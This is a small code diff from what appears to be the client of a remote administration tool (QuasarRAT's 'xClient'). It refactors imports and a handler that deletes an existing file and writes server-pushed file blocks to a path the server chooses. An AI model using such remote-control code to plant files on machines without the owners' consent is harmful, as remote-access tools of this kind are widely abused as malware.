@@ -1,8 +1,9 @@
 ﻿using System;
 using System.IO;
 using System.Threading;
-using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
+using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
@@ -101,7 +102,7 @@ namespace xClient.Core.Commands
         public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
         {
             if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
-                DeleteFile(command.RemotePath); // delete existing file
+                NativeMethods.DeleteFile(command.RemotePath); // delete existing file
 
             FileSplit destFile = new FileSplit(command.RemotePath);
             destFile.AppendBlock(command.Block, command.CurrentBlock);
